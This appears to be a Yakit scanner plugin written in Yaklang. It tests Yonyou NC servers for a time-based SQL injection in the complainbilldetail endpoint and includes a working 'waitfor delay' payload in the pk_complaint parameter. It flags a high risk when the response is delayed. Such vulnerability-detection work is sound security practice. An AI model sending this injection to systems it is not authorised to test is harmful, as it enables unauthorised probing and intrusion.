# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `GET /ebvp/advorappcoll/complainbilldetail?pageId=login&pk_complaint=1'waitfor+delay+'0:0:5'-- HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

`
    begin_time=time.now()
    rsp,req,_ = poc.HTTP(packet1,
    poc.params({"target": addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    poc.timeout(5),
    )
    resp_time=time.Since(begin_time)
    //dump(rsp)

    if int(resp_time) > 5000000000{
        risk.NewRisk(
            target, risk.severity("high"),
            risk.title(f"用友NC-complainbilldetail  SQL注入漏洞 "),
            risk.titleVerbose("用友NC-complainbilldetail  SQL注入漏洞"),
            risk.request(req),
            risk.response(rsp),
            risk.cve("no cve"),
            risk.details({
                "packet":string(packet1),
            }),
        )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
